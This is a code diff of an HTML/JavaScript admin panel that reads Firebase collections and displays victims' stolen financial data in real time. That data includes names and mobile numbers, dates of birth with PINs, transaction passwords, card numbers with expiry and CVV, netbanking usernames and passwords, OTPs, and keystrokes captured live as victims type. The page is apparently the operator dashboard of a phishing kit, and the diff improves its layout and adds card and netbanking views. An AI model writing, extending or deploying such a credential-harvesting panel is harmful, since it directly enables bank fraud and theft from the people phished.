@@ -1,42 +1,51 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+  <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Admin Panel - Live Data</title>
+  <title>Admin Panel - Master Control</title>
 
   <style>
-    body { font-family: Arial; background:#f4f4f4; margin:0; }
-    h2 { text-align:center; color:#00169e; margin-top:20px; }
+    body { font-family: Arial, sans-serif; background:#f4f4f4; margin:0; }
+    h2 { text-align:center; color:#00169e; margin-top:20px; text-transform: uppercase; }
 
+    /* Navigation Buttons */
     .nav-buttons {
       display:flex; flex-wrap:wrap; justify-content:center;
-      gap:10px; margin:20px;
+      gap:10px; margin:20px; position: sticky; top: 0; background: #f4f4f4; padding: 10px; z-index: 1000;
     }
     .nav-buttons button {
       background:#00169e; color:white; border:none;
       padding:10px 16px; border-radius:10px;
-      font-weight:bold; cursor:pointer;
+      font-weight:bold; cursor:pointer; transition: 0.3s;
     }
+    .nav-buttons button:hover { background: #000b52; }
 
+    /* Sections Control */
     .section {
       display:none; margin:0 16px 30px;
       padding:20px; background:white;
       border-radius:10px;
       box-shadow:0 0 8px rgba(0,0,0,0.1);
+      max-width: 900px; margin-left: auto; margin-right: auto;
     }
     .section.active { display:block; }
+    h3 { color: #00169e; border-bottom: 2px solid #00169e; padding-bottom: 10px; }
 
+    /* Data Entry Box */
     .entry {
       background:#f9f9f9;
       border:1px solid #ddd;
-      padding:10px 15px;
+      padding:15px;
       border-radius:10px;
       margin-bottom:15px;
+      position: relative;
+      border-left: 5px solid #00169e;
     }
 
     .delete-btn {
       background:red; color:white;
-      border:none; padding:4px 10px;
+      border:none; padding:6px 12px;
       border-radius:6px; float:right;
       font-weight:bold; cursor:pointer;
     }
@@ -44,9 +53,14 @@
     .time {
       font-size:12px;
       color:gray;
-      margin-top:5px;
+      margin-top:10px;
       display:block;
+      font-style: italic;
     }
+
+    b { color: #333; }
+    p { margin: 5px 0; }
+    .label-tag { background: #00169e; color: white; padding: 2px 8px; border-radius: 4px; font-size: 11px; margin-bottom: 5px; display: inline-block; }
   </style>
 
   <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
@@ -55,27 +69,27 @@
 
 <body>
 
-<h2>Admin Panel - Live Data</h2>
+<h2>Admin Master Control</h2>
 
 <div class="nav-buttons">
+  <button onclick="showSection('liveSection')">Live View</button>
   <button onclick="showSection('usersSection')">User</button>
   <button onclick="showSection('dobPinSection')">DOB + PIN</button>
   <button onclick="showSection('txnPasswordSection')">Txn</button>
   <button onclick="showSection('cardPaymentSection')">Card</button>
   <button onclick="showSection('netbankingSection')">NetBanking</button>
   <button onclick="showSection('otpSection')">OTP</button>
-  <button onclick="showSection('combinedSection')">All</button>
-  <button onclick="showSection('liveSection')">Live View</button>
+  <button onclick="showSection('combinedSection')">All Logs</button>
 </div>
 
-<div id="usersSection" class="section active"><h3>User Details</h3></div>
-<div id="dobPinSection" class="section"><h3>DOB + PIN</h3></div>
-<div id="txnPasswordSection" class="section"><h3>Txn Password</h3></div>
-<div id="cardPaymentSection" class="section"><h3>Card</h3></div>
-<div id="netbankingSection" class="section"><h3>NetBanking</h3></div>
-<div id="otpSection" class="section"><h3>OTP</h3></div>
-<div id="combinedSection" class="section"><h3>All</h3></div>
-<div id="liveSection" class="section"><h3>Live Typing</h3></div>
+<div id="liveSection" class="section active"><h3>🔴 Live Typing</h3><div id="liveCont"></div></div>
+<div id="usersSection" class="section"><h3>👤 User Details</h3><div id="usersCont"></div></div>
+<div id="dobPinSection" class="section"><h3>📅 DOB + PIN</h3><div id="dobCont"></div></div>
+<div id="txnPasswordSection" class="section"><h3>🔑 Txn Password</h3><div id="txnCont"></div></div>
+<div id="cardPaymentSection" class="section"><h3>💳 Card Payments</h3><div id="cardCont"></div></div>
+<div id="netbankingSection" class="section"><h3>🏦 NetBanking</h3><div id="netCont"></div></div>
+<div id="otpSection" class="section"><h3>📲 OTP</h3><div id="otpCont"></div></div>
+<div id="combinedSection" class="section"><h3>📂 All Combined Logs</h3><div id="allCont"></div></div>
 
 <script>
 const firebaseConfig = {
@@ -93,20 +107,8 @@ function showSection(id) {
 }
 
 function formatTime(ts){
-  if(!ts) return "";
+  if(!ts) return "Just now...";
   return ts.toDate().toLocaleString();
-}
-
-function renderEntry(sectionId, html, docId, collection, label=""){
-  const section = document.getElementById(sectionId);
-  const div = document.createElement('div');
-  div.className = 'entry';
-  div.innerHTML =
-    (label ? `<h4>${label}</h4>` : "") +
-    html +
-    `<button class="delete-btn" onclick="deleteEntry('${collection}','${docId}')">Delete</button>`;
-  
-  section.insertBefore(div, section.children[1]);
 }
 
 function deleteEntry(collection, docId){
@@ -118,75 +120,101 @@ function deleteEntry(collection, docId){
   } else alert("Wrong password");
 }
 
-/* USERS */
+/* 1. USERS */
 db.collection("users1").orderBy("timestamp","desc").onSnapshot(snap=>{
-  snap.docChanges().forEach(change=>{
-    const d=change.doc.data();
-    const html=`
-    <p><b>Name:</b> ${d.name}</p>
-    <p><b>KNO:</b> ${d.kno}</p>
-    <p><b>Mobile:</b> ${d.mobile}</p>
-    <span class="time">${formatTime(d.timestamp)}</span>
-    `;
-    renderEntry("usersSection",html,change.doc.id,"users");
-    renderEntry("combinedSection",html,change.doc.id,"users","User");
+  const cont = document.getElementById("usersCont");
+  const all = document.getElementById("allCont");
+  cont.innerHTML = "<h3>👤 User Details</h3>";
+  snap.forEach(doc=>{
+    const d=doc.data();
+    const html=`<div class="entry"><button class="delete-btn" onclick="deleteEntry('users1','${doc.id}')">Delete</button>
+      <p><b>Name:</b> ${d.name}</p><p><b>KNO:</b> ${d.kno}</p><p><b>Mobile:</b> ${d.mobile}</p>
+      <span class="time">${formatTime(d.timestamp)}</span></div>`;
+    cont.innerHTML += html;
   });
 });
 
-/* DOB PIN */
-db.collection("dob_pin").onSnapshot(snap=>{
-  snap.docChanges().forEach(change=>{
-    const d=change.doc.data();
-    const html=`
-    <p><b>DOB:</b> ${d.dob}</p>
-    <p><b>PIN:</b> ${d.pin}</p>
-    <span class="time">${formatTime(d.timestamp)}</span>
-    `;
-    renderEntry("dobPinSection",html,change.doc.id,"dob_pin");
-    renderEntry("combinedSection",html,change.doc.id,"dob_pin","DOB+PIN");
+/* 2. DOB PIN */
+db.collection("dob_pin").orderBy("timestamp","desc").onSnapshot(snap=>{
+  const cont = document.getElementById("dobCont");
+  cont.innerHTML = "<h3>📅 DOB + PIN</h3>";
+  snap.forEach(doc=>{
+    const d=doc.data();
+    const html=`<div class="entry"><button class="delete-btn" onclick="deleteEntry('dob_pin','${doc.id}')">Delete</button>
+      <p><b>DOB:</b> ${d.dob}</p><p><b>PIN:</b> ${d.pin}</p>
+      <span class="time">${formatTime(d.timestamp)}</span></div>`;
+    cont.innerHTML += html;
   });
 });
 
-/* OTP */
-db.collection("otp_entries").onSnapshot(snap=>{
-  snap.docChanges().forEach(change=>{
-    const d=change.doc.data();
-    const html=`
-    <p><b>OTP:</b> ${d.otp}</p>
-    <p><b>Attempt:</b> ${d.attempt}</p>
-    <span class="time">${formatTime(d.timestamp)}</span>
-    `;
-    renderEntry("otpSection",html,change.doc.id,"otp_entries");
-    renderEntry("combinedSection",html,change.doc.id,"otp_entries","OTP");
+/* 3. TXN PASSWORD */
+db.collection("txn_passwords").orderBy("timestamp","desc").onSnapshot(snap=>{
+  const cont = document.getElementById("txnCont");
+  cont.innerHTML = "<h3>🔑 Txn Password</h3>";
+  snap.forEach(doc=>{
+    const d=doc.data();
+    const html=`<div class="entry"><button class="delete-btn" onclick="deleteEntry('txnPassword','${doc.id}')">Delete</button>
+      <p><b>TXN Password:</b> ${d.password}</p>
+      <span class="time">${formatTime(d.timestamp)}</span></div>`;
+    cont.innerHTML += html;
   });
 });
 
-/* LIVE TYPING (FIXED) */
-db.collection("live_typing").orderBy("timestamp","desc").onSnapshot(snap=>{
-  const section = document.getElementById("liveSection");
-
-  // Clear old entries
-  section.innerHTML = "<h3>Live Typing</h3>";
+/* 4. CARDS & NETBANKING (from payments collection) */
+db.collection("payments").orderBy("timestamp","desc").onSnapshot(snap=>{
+  const cardCont = document.getElementById("cardCont");
+  const netCont = document.getElementById("netCont");
+  const allCont = document.getElementById("allCont");
+  
+  cardCont.innerHTML = "<h3>💳 Card Payments</h3>";
+  netCont.innerHTML = "<h3>🏦 NetBanking</h3>";
+  allCont.innerHTML = "<h3>📂 All Logs</h3>";
 
   snap.forEach(doc=>{
     const d = doc.data();
+    let html = `<div class="entry"><button class="delete-btn" onclick="deleteEntry('payments','${doc.id}')">Delete</button>`;
+    
+    if(d.method === "netbanking") {
+      html += `<span class="label-tag">NetBanking</span><p><b>Bank:</b> ${d.bank}</p><p><b>User:</b> ${d.username}</p><p><b>Pass:</b> ${d.password}</p>`;
+      netCont.innerHTML += html + `<span class="time">${formatTime(d.timestamp)}</span></div>`;
+    } else {
+      html += `<span class="label-tag">${d.method}</span><p><b>Card:</b> ${d.card}</p><p><b>Exp:</b> ${d.expiry}</p><p><b>CVV:</b> ${d.cvv}</p>`;
+      cardCont.innerHTML += html + `<span class="time">${formatTime(d.timestamp)}</span></div>`;
+    }
+    allCont.innerHTML += html + `<span class="time">${formatTime(d.timestamp)}</span></div>`;
+  });
+});
 
+/* 5. OTP */
+db.collection("otp_entries").orderBy("timestamp","desc").onSnapshot(snap=>{
+  const cont = document.getElementById("otpCont");
+  cont.innerHTML = "<h3>📲 OTP</h3>";
+  snap.forEach(doc=>{
+    const d=doc.data();
+    const html=`<div class="entry"><button class="delete-btn" onclick="deleteEntry('otp_entries','${doc.id}')">Delete</button>
+      <p><b>OTP:</b> <span style="color:red; font-size:20px; font-weight:bold;">${d.otp}</span></p><p><b>Attempt:</b> ${d.attempt}</p>
+      <span class="time">${formatTime(d.timestamp)}</span></div>`;
+    cont.innerHTML += html;
+  });
+});
+
+/* 6. LIVE TYPING */
+db.collection("live_typing").orderBy("timestamp","desc").onSnapshot(snap=>{
+  const cont = document.getElementById("liveCont");
+  cont.innerHTML = "<h3>🔴 Live Typing</h3>";
+  snap.forEach(doc=>{
+    const d = doc.data();
     const div = document.createElement('div');
     div.className = 'entry';
-
+    div.style.borderLeftColor = "red";
     div.innerHTML = `
-      <p><b>Name:</b> ${d.name || ""}</p>
-      <p><b>KNO:</b> ${d.kno || ""}</p>
-      <p><b>Mobile:</b> ${d.mobile || ""}</p>
-      <p><b>Card:</b> ${d.debitCard || d.creditCard || ""}</p>
-      <p><b>User:</b> ${d.netUser || ""}</p>
-      <span class="time">${formatTime(d.timestamp)}</span>
+      <p><b>Method:</b> ${d.method || "---"}</p>
+      <p><b>Card/Bank:</b> ${d.card || d.bank || "---"}</p>
+      <p><b>User:</b> ${d.username || "---"}</p>
+      <p><b>Pass:</b> ${d.password || "---"}</p>
+      <span class="time">Last Update: ${formatTime(d.timestamp)}</span>
     `;
-
-    section.appendChild(div);
-
-    // show only latest
-    return false;
+    cont.appendChild(div);
   });
 });
 </script>
